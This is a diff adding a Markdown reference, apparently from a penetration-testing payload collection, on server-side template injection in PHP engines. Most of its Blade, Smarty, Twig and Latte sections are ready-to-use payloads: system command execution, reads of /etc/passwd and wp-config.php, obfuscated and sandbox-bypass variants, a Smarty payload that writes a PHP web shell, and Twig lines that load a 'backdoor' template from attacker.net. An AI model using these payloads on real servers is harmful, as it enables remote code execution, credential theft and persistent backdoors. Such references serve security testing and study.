@@ -1,0 +1,346 @@
+# Server Side Template Injection - PHP
+
+> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.
+
+## Summary
+
+- [Templating Libraries](#templating-libraries)
+- [Universal Payloads](#universal-payloads)
+- [Blade](#blade)
+- [Smarty](#smarty)
+    - [Smarty - Code Execution with Obfuscation](#smarty---code-execution-with-obfuscation)
+- [Twig](#twig)
+    - [Twig - Basic Injection](#twig---basic-injection)
+    - [Twig - Template Format](#twig---template-format)
+    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
+    - [Twig - Code Execution](#twig---code-execution)
+    - [Twig - Code Execution with Obfuscation](#twig---code-execution-with-obfuscation)
+- [Latte](#latte)
+    - [Latte - Basic Injection](#latte---basic-injection)
+    - [Latte - Code Execution](#latte---code-execution)
+- [patTemplate](#pattemplate)
+- [PHPlib](#phplib-and-html_template_phplib)
+- [Plates](#plates)
+- [References](#references)
+
+## Templating Libraries
+
+| Template Name   | Payload Format |
+|-----------------|----------------|
+| Blade (Laravel) | `{{ }}`        |
+| Latte           | `{ }`          |
+| Mustache        | `{{ }}`        |
+| Plates          | `<?= ?>`       |
+| Smarty          | `{ }`          |
+| Twig            | `{{ }}`        |
+
+## Universal Payloads
+
+Generic code injection payloads work for many PHP-based template engines, such as Blade, Latte and Smarty.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```php
+// Rendered RCE
+shell_exec('id')
+system('id')
+
+// Error-Based RCE
+ini_set("error_reporting", "1") // Enable verbose fatal errors for Error-Based
+call_user_func(join("", ["xx", shell_exec('id')]))
+
+// Boolean-Based RCE
+1 / (pclose(popen("id", "wb")) == 0)
+
+// Time-Based RCE
+shell_exec('id && sleep 5')
+system('id && sleep 5')
+```
+
+## Blade
+
+> Universal payloads also work for Blade.
+
+[Official website](https://laravel.com/docs/master/blade)
+> Blade is the simple, yet powerful templating engine that is included with Laravel.
+
+The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.
+
+```php
+{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
+---
+
+## Smarty
+
+> Universal payloads also work for Smarty before v5.
+
+[Official website](https://www.smarty.net/docs/en/)
+> Smarty is a template engine for PHP.
+
+```php
+{$smarty.version}
+{php}echo `id`;{/php} //deprecated in smarty v3
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')} // compatible v3, deprecated in v5
+{system('cat index.php')} // compatible v3, deprecated in v5
+```
+
+### Smarty - Code Execution with Obfuscation
+
+By employing the variable modifier `cat`, individual characters are concatenated to form the string "id" as follows: `{chr(105)|cat:chr(100)}`.
+
+Execute system comman (command: `id`):
+
+```php
+{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
+---
+
+## Twig
+
+[Official website](https://twig.symfony.com/)
+> Twig is a modern template engine for PHP.
+
+### Twig - Basic Injection
+
+```php
+{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{dump(_context)}}
+{{app.request.server.all|join(',')}}
+```
+
+### Twig - Template Format
+
+```php
+$output = $twig > render (
+  'Dear' . $_GET['custom_greeting'],
+  array("first_name" => $user.first_name)
+);
+
+$output = $twig > render (
+  "Dear {first_name}",
+  array("first_name" => $user.first_name)
+);
+```
+
+### Twig - Arbitrary File Reading
+
+```php
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{include("wp-config.php")}}
+```
+
+### Twig - Code Execution
+
+```php
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['id']|map('passthru')}}
+{{['nslookup oastify.com']|filter('system')}}
+
+{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
+{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0
+
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
+{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0
+
+{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614
+{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
+```
+
+With certain settings, Twig interrupts rendering, if any errors or warnings are raised. This payload works fine in these cases:
+
+```php
+{{ {'id':'shell_exec'}|map('call_user_func')|join }}
+```
+
+Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
+
+```python
+FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
+```
+
+### Twig - Code Execution with Obfuscation
+
+Twig's block feature and built-in `_charset` variable can be nesting can be used to produced the payload (command: `id`)
+
+```twig
+{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
+```
+
+The following payload, which harnesses the built-in `_context` variable, also achieves RCE – provided that the template engine performs a double-rendering process:
+
+```twig
+{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
+---
+
+## Latte
+
+> Universal payloads also work for Latte.
+
+### Latte - Basic Injection
+
+```php
+{var $X="POC"}{$X}
+```
+
+### Latte - Code Execution
+
+```php
+{php system('nslookup oastify.com')}
+```
+
+---
+
+## patTemplate
+
+> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts
+
+```xml
+<patTemplate:tmpl name="page">
+  This is the main page.
+  <patTemplate:tmpl name="foo">
+    It contains another template.
+  </patTemplate:tmpl>
+  <patTemplate:tmpl name="hello">
+    Hello {NAME}.<br/>
+  </patTemplate:tmpl>
+</patTemplate:tmpl>
+```
+
+---
+
+## PHPlib and HTML_Template_PHPLIB
+
+[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.
+
+`authors.tpl`
+
+```html
+<html>
+ <head><title>{PAGE_TITLE}</title></head>
+ <body>
+  <table>
+   <caption>Authors</caption>
+   <thead>
+    <tr><th>Name</th><th>Email</th></tr>
+   </thead>
+   <tfoot>
+    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
+   </tfoot>
+   <tbody>
+<!-- BEGIN authorline -->
+    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
+<!-- END authorline -->
+   </tbody>
+  </table>
+ </body>
+</html>
+```
+
+`authors.php`
+
+```php
+<?php
+//we want to display this author list
+$authors = array(
+    'Christian Weiske'  => 'cweiske@php.net',
+    'Bjoern Schotte'     => 'schotte@mayflower.de'
+);
+
+require_once 'HTML/Template/PHPLIB.php';
+//create template object
+$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
+//load file
+$t->setFile('authors', 'authors.tpl');
+//set block
+$t->setBlock('authors', 'authorline', 'authorline_ref');
+
+//set some variables
+$t->setVar('NUM_AUTHORS', count($authors));
+$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));
+
+//display the authors
+foreach ($authors as $name => $email) {
+    $t->setVar('AUTHOR_NAME', $name);
+    $t->setVar('AUTHOR_EMAIL', $email);
+    $t->parse('authorline_ref', 'authorline', true);
+}
+
+//finish and echo
+echo $t->finish($t->parse('OUT', 'authors'));
+?>
+```
+
+---
+
+## Plates
+
+Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.
+
+controller:
+
+```php
+// Create new Plates instance
+$templates = new League\Plates\Engine('/path/to/templates');
+
+// Render a template
+echo $templates->render('profile', ['name' => 'Jonathan']);
+```
+
+page template:
+
+```php
+<?php $this->layout('template', ['title' => 'User Profile']) ?>
+
+<h1>User Profile</h1>
+<p>Hello, <?=$this->e($name)?></p>
+```
+
+layout template:
+
+```php
+<html>
+  <head>
+    <title><?=$this->e($title)?></title>
+  </head>
+  <body>
+    <?=$this->section('content')?>
+  </body>
+</html>
+```
+
+## References
+
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [Server Side Template Injection (SSTI) via Twig escape handler - Grav - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
